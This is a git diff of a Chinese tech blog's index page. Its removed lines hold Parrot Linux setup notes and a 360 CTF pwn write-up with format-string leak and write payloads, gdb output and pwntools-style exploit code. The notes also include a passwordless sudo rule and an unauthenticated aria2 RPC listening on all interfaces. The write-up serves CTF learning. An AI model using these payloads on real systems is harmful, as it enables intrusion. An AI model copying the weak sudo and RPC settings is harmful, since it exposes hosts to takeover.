-<h2 id="出现软件无法启动问题"><a href="#出现软件无法启动问题" class="headerlink" title="出现软件无法启动问题"></a>出现软件无法启动问题</h2><p>删除沙盒里的配置文件就行，或者注释掉部分<br>/etc/firejail 存着对应软件的沙盒配置文件</p>
-<h2 id="v2ray问题"><a href="#v2ray问题" class="headerlink" title="v2ray问题"></a>v2ray问题</h2><p>v2ray连不上有两个原因，<br>1.时间<br>2.配置文件，因为配置文件差了个流量控制的邮箱</p>
-<p>时间问题可以安装ntpdate<br>sudo apt-get install ntpdate<br>sudo ntpdate 0.asia.pool.ntp.org</p>
-<p>vi /etc/crontab<br>在末尾增加* */1 * * * ntpdate 0.asia.pool.ntp.org</p>
-<p>同步到硬件<br>hwclock –systohc</p>
-<h2 id="vmware问题"><a href="#vmware问题" class="headerlink" title="vmware问题"></a>vmware问题</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">VMWARE_VERSION=workstation-12.5.9</span><br><span class="line">TMP_FOLDER=/tmp/patch-vmware</span><br><span class="line">rm -fdr <span class="variable">$TMP_FOLDER</span></span><br><span class="line">mkdir -p <span class="variable">$TMP_FOLDER</span></span><br><span class="line"><span class="built_in">cd</span> <span class="variable">$TMP_FOLDER</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/mkubecek/vmware-host-modules.git</span><br><span class="line"><span class="built_in">cd</span> <span class="variable">$TMP_FOLDER</span>/vmware-host-modules</span><br><span class="line">git checkout <span class="variable">$VMWARE_VERSION</span></span><br><span class="line">git fetch</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br><span class="line">sudo rm /usr/lib/vmware/lib/libz.so.1/libz.so.1</span><br><span class="line">sudo ln -s /lib/x86_64-linux-gnu/libz.so.1 /usr/lib/vmware/lib/libz.so.1/libz.so.1</span><br><span class="line">sudo /etc/init.d/vmware restart</span><br></pre></td></tr></table></figure>
-
-<h2 id="vimplus"><a href="#vimplus" class="headerlink" title="vimplus"></a>vimplus</h2><p>apt install vim-python-jedi<br>开机自启脚本</p>
-<h2 id="双系统引导找回问题"><a href="#双系统引导找回问题" class="headerlink" title="双系统引导找回问题"></a>双系统引导找回问题</h2><p>进行live模式<br>先查看哪个是linux启动盘</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fdisk -l</span><br></pre></td></tr></table></figure>
-<p>然后挂载</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mount /dev/sda2 /mnt</span><br><span class="line">mount --<span class="built_in">bind</span> /proc /mnt/proc</span><br><span class="line">mount --<span class="built_in">bind</span> /dev /mnt/dev</span><br><span class="line">mount --<span class="built_in">bind</span> /sys /mnt/sys</span><br><span class="line">chroot /mnt</span><br><span class="line">apt-get install grub-pc <span class="comment">#可有可无</span></span><br><span class="line">grub-mkconfig <span class="comment">#可有可无</span></span><br><span class="line">update-grub</span><br><span class="line">grub-install /dev/sda <span class="comment">#可有可无</span></span><br></pre></td></tr></table></figure>
-
-
-<h2 id="aria2"><a href="#aria2" class="headerlink" title="aria2"></a>aria2</h2><p>sudo apt-get install aria2</p>
-<p>/etc/aria2/aria2.conf</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#用户名</span></span><br><span class="line"><span class="comment">#rpc-user=user</span></span><br><span class="line"><span class="comment">#密码</span></span><br><span class="line"><span class="comment">#rpc-passwd=passwd</span></span><br><span class="line"><span class="comment">#上面的认证方式不建议使用,建议使用下面的token方式</span></span><br><span class="line"><span class="comment">#设置加密的密钥</span></span><br><span class="line"><span class="comment">#rpc-secret=token</span></span><br><span class="line"><span class="comment">#允许rpc</span></span><br><span class="line"><span class="built_in">enable</span>-rpc=<span class="literal">true</span></span><br><span class="line"><span class="comment">#允许所有来源, web界面跨域权限需要</span></span><br><span class="line">rpc-allow-origin-all=<span class="literal">true</span></span><br><span class="line"><span class="comment">#允许外部访问，false的话只监听本地端口</span></span><br><span class="line">rpc-listen-all=<span class="literal">true</span></span><br><span class="line"><span class="comment">#RPC端口, 仅当默认端口被占用时修改</span></span><br><span class="line"><span class="comment">#rpc-listen-port=6800</span></span><br><span class="line"><span class="comment">#最大同时下载数(任务数), 路由建议值: 3</span></span><br><span class="line">max-concurrent-downloads=5</span><br><span class="line"><span class="comment">#断点续传</span></span><br><span class="line"><span class="built_in">continue</span>=<span class="literal">true</span></span><br><span class="line"><span class="comment">#同服务器连接数</span></span><br><span class="line">max-connection-per-server=5</span><br><span class="line"><span class="comment">#最小文件分片大小, 下载线程数上限取决于能分出多少片, 对于小文件重要</span></span><br><span class="line">min-split-size=10M</span><br><span class="line"><span class="comment">#单文件最大线程数, 路由建议值: 5</span></span><br><span class="line">split=10</span><br><span class="line"><span class="comment">#下载速度限制</span></span><br><span class="line">max-overall-download-limit=0</span><br><span class="line"><span class="comment">#单文件速度限制</span></span><br><span class="line">max-download-limit=0</span><br><span class="line"><span class="comment">#上传速度限制</span></span><br><span class="line">max-overall-upload-limit=0</span><br><span class="line"><span class="comment">#单文件速度限制</span></span><br><span class="line">max-upload-limit=0</span><br><span class="line"><span class="comment">#断开速度过慢的连接</span></span><br><span class="line"><span class="comment">#lowest-speed-limit=0</span></span><br><span class="line"><span class="comment">#验证用，需要1.16.1之后的release版本</span></span><br><span class="line"><span class="comment">#referer=*</span></span><br><span class="line"><span class="comment">#文件保存路径, 默认为当前启动位置</span></span><br><span class="line">dir=/Users/&lt;user_name&gt;/Downloads</span><br><span class="line"><span class="comment">#文件缓存, 使用内置的文件缓存, 如果你不相信Linux内核文件缓存和磁盘内置缓存时使用, 需要1.16及以上版本</span></span><br><span class="line"><span class="comment">#disk-cache=0</span></span><br><span class="line"><span class="comment">#另一种Linux文件缓存方式, 使用前确保您使用的内核支持此选项, 需要1.15及以上版本(?)</span></span><br><span class="line"><span class="comment">#enable-mmap=true</span></span><br><span class="line"><span class="comment">#文件预分配, 能有效降低文件碎片, 提高磁盘性能. 缺点是预分配时间较长</span></span><br><span class="line"><span class="comment">#所需时间 none &lt; falloc ? trunc « prealloc, falloc和trunc需要文件系统和内核支持</span></span><br><span class="line">file-allocation=prealloc</span><br></pre></td></tr></table></figure>
-
-<p>/etc/init.d/aria2c</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="comment">### BEGIN INIT INFO</span></span><br><span class="line"><span class="comment"># Provides: aria2</span></span><br><span class="line"><span class="comment"># Required-Start: $remote_fs $network</span></span><br><span class="line"><span class="comment"># Required-Stop: $remote_fs $network</span></span><br><span class="line"><span class="comment"># Default-Start: 2 3 4 5</span></span><br><span class="line"><span class="comment"># Default-Stop: 0 1 6</span></span><br><span class="line"><span class="comment"># Short-Description: Aria2 Downloader</span></span><br><span class="line"><span class="comment">### END INIT INFO</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">case</span> <span class="string">"<span class="variable">$1</span>"</span> <span class="keyword">in</span></span><br><span class="line">start)</span><br><span class="line"> </span><br><span class="line"> <span class="built_in">echo</span> -n <span class="string">"已开启Aria2c"</span></span><br><span class="line"> sudo aria2c --conf-path=/etc/aria2/aria2.conf -D</span><br><span class="line">;;</span><br><span class="line">stop)</span><br><span class="line"> </span><br><span class="line"> <span class="built_in">echo</span> -n <span class="string">"已关闭Aria2c"</span></span><br><span class="line"> killall aria2c</span><br><span class="line">;;</span><br><span class="line">restart)</span><br><span class="line"> </span><br><span class="line"> killall aria2c</span><br><span class="line"> sudo aria2c --conf-path=/etc/aria2/aria2.conf -D</span><br><span class="line">;;</span><br><span class="line"><span class="keyword">esac</span></span><br><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
-
-<p>谷歌插件</p>
-<h2 id="sudo-设置不用密码"><a href="#sudo-设置不用密码" class="headerlink" title="sudo 设置不用密码"></a>sudo 设置不用密码</h2><p>%greenhand ALL=(ALL) NOPASSWD: NOPASSWD:ALL</p>
-<h2 id="阿里云docker加速镜像"><a href="#阿里云docker加速镜像" class="headerlink" title="阿里云docker加速镜像"></a>阿里云docker加速镜像</h2><p>vi /etc/docker/daemon.json</p>
-<p>{</p>
-<p>“registry-mirrors”: [“<a href="http://hub-mirror.c.163.com&quot;]" target="_blank" rel="noopener">http://hub-mirror.c.163.com&quot;]</a></p>
-<p>}</p>
-<p><a href="https://cr.console.aliyun.com/cn-hangzhou/instances/mirrors" target="_blank" rel="noopener">https://cr.console.aliyun.com/cn-hangzhou/instances/mirrors</a></p>
-<h2 id="pip-换源"><a href="#pip-换源" class="headerlink" title="pip 换源"></a>pip 换源</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mkdir ~/.pip</span><br><span class="line">cat &gt;&gt; ~/.pip/pip.conf &lt;&lt; EOF</span><br><span class="line">[global]</span><br><span class="line">index-url =  http://mirrors.aliyun.com/pypi/simple/ </span><br><span class="line">trusted-host = mirrors.aliyun.com</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure>
-
-<h2 id="禁用虚拟网卡"><a href="#禁用虚拟网卡" class="headerlink" title="禁用虚拟网卡"></a>禁用虚拟网卡</h2><p>内网段冲突</p>
-<p>ifconfig b47cab9fe564 down</p>
-<h2 id="docker-存在依赖无法删除"><a href="#docker-存在依赖无法删除" class="headerlink" title="docker 存在依赖无法删除"></a>docker 存在依赖无法删除</h2><p>docker commit 容器id 名称<br>docker save -o 压缩包.tar 新镜像名称:latest</p>
-<p>删除所有关于这个的镜像以及容易<br>docker load -i ./压缩包.tar</p>
-<h2 id="wine依赖问题"><a href="#wine依赖问题" class="headerlink" title="wine依赖问题"></a>wine依赖问题</h2><p>删除winehq-stable的官方源，用parrot的源安装就可以了</p>
-<h2 id="parrot-关闭更新提示"><a href="#parrot-关闭更新提示" class="headerlink" title="parrot 关闭更新提示"></a>parrot 关闭更新提示</h2><p>修改配置文件</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/xdg/autostart/parrot-updater.desktop</span><br></pre></td></tr></table></figure>
-
-<p>文件内容如下</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env xdg-open</span></span><br><span class="line">[Desktop Entry]</span><br><span class="line">Name=System Updater</span><br><span class="line">Comment=Update reminder <span class="keyword">for</span> Parrot OS</span><br><span class="line">Icon=synaptic</span><br><span class="line">Exec=/usr/bin/update-reminder scheduled</span><br><span class="line">Terminal=<span class="literal">false</span></span><br><span class="line">Type=Application</span><br><span class="line">Categories=</span><br><span class="line">X-MATE-Autostart-enabled=<span class="literal">true</span></span><br></pre></td></tr></table></figure>
-
-
-<h2 id="配置文件导入导出"><a href="#配置文件导入导出" class="headerlink" title="配置文件导入导出"></a>配置文件导入导出</h2><p>dconf dump / &gt; dconf-settings.ini<br>dconf load / &lt; dconf-settings.ini</p>
-
+          <h1 id="parot-linux系统问题总结"><a href="#parot-linux系统问题总结" class="headerlink" title="parot linux系统问题总结"></a>parot linux系统问题总结</h1><h2 id="出现命令行无法启动torbrowser-launcher"><a href="#出现命令行无法启动torbrowser-launcher" class="headerlink" title="出现命令行无法启动torbrowser-launcher"></a>出现命令行无法启动torbrowser-launcher</h2><p>这个问题我谷歌了很久，也没有得到有效的答案，所以只能自己动手测试，这是一个程序员基本功，我重新安装了好几次torbrowser-launcher，也没有得到解决，所以不是安装的问题，是机器环境的问题。</p><p>在我的parrot sercurity上出现的错误是这样的：<br><big> + Tor Browser Launcher</big></p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2019/04/19/parrot-linux/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -916,7 +976,28 @@
                 </span>
             </span>
 
-          <br>
+          
+            <span id="/2019/04/19/bin_security/" class="post-meta-item leancloud_visitors" data-flag-title="书籍文章目录" title="Views">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="fa fa-comment-o"></i>
+      </span>
+      <span class="post-meta-item-text">Valine: </span>
+    
+    <a title="valine" href="/2019/04/19/bin_security/#comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2019/04/19/bin_security/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  <br>
             <span class="post-meta-item" title="Symbols count in article">
               <span class="post-meta-item-icon">
                 <i class="fa fa-file-word-o"></i>
@@ -942,7 +1023,6 @@
 
       
           <p>第一节：二进制安全概述<br>第二节：基础知识<br>    2.1 什么是软件<br>    2.2 什么是恶意软件<br>        2.2.1 潜藏广告<br>        2.2.2 木马<br>        2.2.3 病毒<br>        2.2.4 后门软件<br>    2.3 什么是漏洞<br>        2.3.1 poc是什么<br>        2.3.2 exp是什么<br>    2.4 虚拟环境<br>        2.4.1 沙盒<br>        2.4.2 虚拟机<br>    2.5 分析手法<br>        2.5.1 静态分析<br>        2.5.2 动态分析<br>第三节：二进制安全应用<br>    3.1 二进制层面的攻击<br>        3.1.1 软件的破解<br>        3.1.2 制作二进制层面的恶意软件<br>        3.1.3 利用软件漏洞攻击<br>    3.2 二进制层面的防御<br>        3.2.1 软件的安全防护<br>        3.2.1 恶意软件的防护<br>        3.2.1 软件漏洞的预防<br>第四节： 常见安全场景<br>    4.1 windows安全<br>    4.2 移动安全<br>        4.2.1 安卓安全<br>        4.2.2 ios安全<br>第五节： 二进制层面的安全防护<br>    5.1 基础级别防护<br>        5.1.1 安装杀毒软件<br>        5.1.2 下载方式的选择<br>        5.1.3 未知软件的处理<br>    5.2 进阶防护<br>        5.2.1 利用工具分析未知软件<br>        5.2.2 根据行为判别软件类别<br>        5.2.3 虚拟环境洞察软件行为<br>        5.2.4 应对处理措施</p>
-
       
     </div>
 
@@ -1018,7 +1098,28 @@
                 </span>
             </span>
 
-          <br>
+          
+            <span id="/2019/04/19/360/" class="post-meta-item leancloud_visitors" data-flag-title="360杯pwn部分题解" title="Views">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="fa fa-comment-o"></i>
+      </span>
+      <span class="post-meta-item-text">Valine: </span>
+    
+    <a title="valine" href="/2019/04/19/360/#comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2019/04/19/360/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  <br>
             <span class="post-meta-item" title="Symbols count in article">
               <span class="post-meta-item-icon">
                 <i class="fa fa-file-word-o"></i>
@@ -1043,68 +1144,15 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h1 id="360杯pwn题解"><a href="#360杯pwn题解" class="headerlink" title="360杯pwn题解"></a>360杯pwn题解</h1><h2 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h2><p>格式化字符串的题目，不过不是常规的栈格式化字符串，放到了bss段里的格式化字符串，当初做的时候不知道，以为常规。。。剩半个钟的时候发觉了，然后也没做了，后面复盘把他做了，发觉也不是那么一蹴而就的，有点意思</p>
-<p>还有个点我不清楚。当时远程泄露libc我是查不到的，所以这个我不知道该如何解决？希望各位大佬能指点一二</p>
-<h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+Ch] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+10h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// [esp+14h] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> *v7; <span class="comment">// [esp+18h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = &amp;argc;</span><br><span class="line">  v6 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"welcome to 360CTF_2019"</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; N; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"1. Input"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"2. Exit"</span>);</span><br><span class="line">    read(<span class="number">0</span>, &amp;buf, <span class="number">4u</span>);</span><br><span class="line">    <span class="keyword">if</span> ( atoi(&amp;buf) != <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( atoi(&amp;buf) != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"It's time to input something"</span>);</span><br><span class="line">    read(<span class="number">0</span>, &amp;buff, <span class="number">0x10</span>u);</span><br><span class="line">    <span class="built_in">printf</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;buff);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Good luck to you!"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>漏洞点很明显就是格式化字符串，N数值为3，所以目前来说只有三次机会，注意buff是在bss段的</p>
-<h3 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h3><p>格式化字符串第一步当然是泄露信息啊</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ stack 25</span><br><span class="line">0000| 0xffb1738c (<span class="string">"!XUV\020pUV\020pUV\020"</span>)</span><br><span class="line">0004| 0xffb17390 --&gt; 0x56557010 (<span class="string">"%22<span class="variable">$x</span>%15<span class="variable">$x</span>\n"</span>)</span><br><span class="line">0008| 0xffb17394 --&gt; 0x56557010 (<span class="string">"%22<span class="variable">$x</span>%15<span class="variable">$x</span>\n"</span>)</span><br><span class="line">0012| 0xffb17398 --&gt; 0x10 </span><br><span class="line">0016| 0xffb1739c (<span class="string">"7WUV\374s\360\367\270oUVtt\261\377\001"</span>)</span><br><span class="line">0020| 0xffb173a0 --&gt; 0xf7f073fc --&gt; 0xf7f08980 --&gt; 0x0 </span><br><span class="line">0024| 0xffb173a4 --&gt; 0x56556fb8 --&gt; 0x1ed8 </span><br><span class="line">0028| 0xffb173a8 --&gt; 0xffb17474 --&gt; 0xffb183ba (<span class="string">"./7631454338ff70b1a6b1262f5f36beac"</span>)</span><br><span class="line">0032| 0xffb173ac --&gt; 0x1 </span><br><span class="line">0036| 0xffb173b0 --&gt; 0x1 </span><br><span class="line">0040| 0xffb173b4 --&gt; 0x0 </span><br><span class="line">0044| 0xffb173b8 --&gt; 0xffb10a31 --&gt; 0x0 </span><br><span class="line">0048| 0xffb173bc --&gt; 0x84188400 </span><br><span class="line">0052| 0xffb173c0 --&gt; 0xffb173e0 --&gt; 0x1 </span><br><span class="line">0056| 0xffb173c4 --&gt; 0x0 </span><br><span class="line">0060| 0xffb173c8 --&gt; 0x0 </span><br><span class="line">0064| 0xffb173cc --&gt; 0xf7d4e7e1 (&lt;__libc_start_main+241&gt;:	add    esp,0x10)</span><br><span class="line">0068| 0xffb173d0 --&gt; 0xf7f07000 --&gt; 0x1d6d6c </span><br><span class="line">0072| 0xffb173d4 --&gt; 0xf7f07000 --&gt; 0x1d6d6c </span><br><span class="line">0076| 0xffb173d8 --&gt; 0x0 </span><br><span class="line">0080| 0xffb173dc --&gt; 0xf7d4e7e1 (&lt;__libc_start_main+241&gt;:	add    esp,0x10)</span><br><span class="line">0084| 0xffb173e0 --&gt; 0x1 </span><br><span class="line">0088| 0xffb173e4 --&gt; 0xffb17474 --&gt; 0xffb183ba (<span class="string">"./7631454338ff70b1a6b1262f5f36beac"</span>)</span><br><span class="line">0092| 0xffb173e8 --&gt; 0xffb1747c --&gt; 0xffb183dd (<span class="string">"MYVIMRC=/home/NoOne/.vimrc"</span>)</span><br><span class="line">0096| 0xffb173ec --&gt; 0xffb17404 --&gt; 0x0</span><br></pre></td></tr></table></figure>
-
-<p>第一次格式化字符串我选了两个地方，%22$x%15$x<br>也就是上面的64跟92处，为什么选这两个位置呢？因为第一个，存了libc地址，第二个存了栈地址，并且他还有二级指针指向栈，这是必须的，因为格式化字符串写在了bss段，要在栈里写东西的话，只能通过二级指针，第一步先将这个地址泄露出来，第二步，往这个地址里写东西，因为这个地址本身就是栈里的嘛，所以写进去后，地址就在栈里了，所以就可以跟常规格式化字符串一样利用了</p>
-<p>还有一点，只有三次机会，并且限制了大小，我第一次泄露，第二次写入要写入的地址，第三次写入的时候长度明显不够，所以我需要增大次数，所以要找到变量i或者N的地址，N的地址我是找不到，所以我找了i，他是个有符号数，我把他高位改成0xff，就可以变成负数，经过测试，上述40处为i,80处为返回地址，<br><img src="_v_images/20191029132200484_1723791493.png" alt="返回地址"></p>
-<p>返回地址可以用find找到，找栈里的libc_start_main存在的地方就是ret</p>
-<p>i调试下就出来了，三次会变化的地方</p>
-<h4 id="准备部分"><a href="#准备部分" class="headerlink" title="准备部分"></a>准备部分</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Input</span><span class="params">(content)</span>:</span></span><br><span class="line">    sla(<span class="string">"2. Exit\n"</span>, <span class="string">"1"</span>)</span><br><span class="line">    sla(<span class="string">"It's time to input something\n"</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(size1, size2)</span>:</span></span><br><span class="line">    payload = <span class="string">"%&#123;&#125;p%&#123;&#125;$hn"</span>.format(size1, <span class="number">21</span>)</span><br><span class="line">    Input(payload)</span><br><span class="line">    payload = <span class="string">"%&#123;&#125;p%&#123;&#125;$hn"</span>.format(size2, <span class="number">57</span>)</span><br><span class="line">    Input(payload)</span><br><span class="line">    payload =<span class="string">"123456781234567"</span></span><br><span class="line">    Input(payload)</span><br></pre></td></tr></table></figure>
-
-
-<h4 id="地址泄露部分"><a href="#地址泄露部分" class="headerlink" title="地址泄露部分"></a>地址泄露部分</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#stage 1</span></span><br><span class="line">payload = <span class="string">"%22$x%15$x"</span></span><br><span class="line">Input(payload)</span><br><span class="line">stack_addr = int(r(<span class="number">8</span>), <span class="number">16</span>)</span><br><span class="line">ret = stack_addr - <span class="number">0xa0</span></span><br><span class="line">count = stack_addr - <span class="number">0xc8</span></span><br><span class="line">__libc_start_main_addr = int(r(<span class="number">8</span>), <span class="number">16</span>)<span class="number">-241</span></span><br><span class="line">lg(<span class="string">"stack_addr"</span>, stack_addr)</span><br><span class="line">lg(<span class="string">"ret_addr"</span>, ret)</span><br><span class="line">lg(<span class="string">"libc_start_main"</span>, __libc_start_main_addr)</span><br><span class="line">lg(<span class="string">"count"</span>, count)</span><br><span class="line">libc_base = __libc_start_main_addr - libc.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">one_gadget = [<span class="number">0x1395ba</span>, <span class="number">0x1395bb</span>]</span><br><span class="line">one_gadget = libc_base + one_gadget[<span class="number">0</span>]</span><br><span class="line">lg(<span class="string">"one_gadget"</span>, one_gadget)</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br></pre></td></tr></table></figure>
-
-<h4 id="修改变量i"><a href="#修改变量i" class="headerlink" title="修改变量i"></a>修改变量i</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">write(<span class="number">0xffff</span> &amp; count + <span class="number">2</span>, <span class="number">0xffff</span>)</span><br></pre></td></tr></table></figure>
-
-<p>至于偏移为什么是这个，需要你们自己去调试，二级指针那个点位就是那个地方，还有修改后四位够了，栈里的位置，注意，这里是修改的是i的地址+2部分，也就是4个字节的前两个字节部分，修改为0xffff</p>
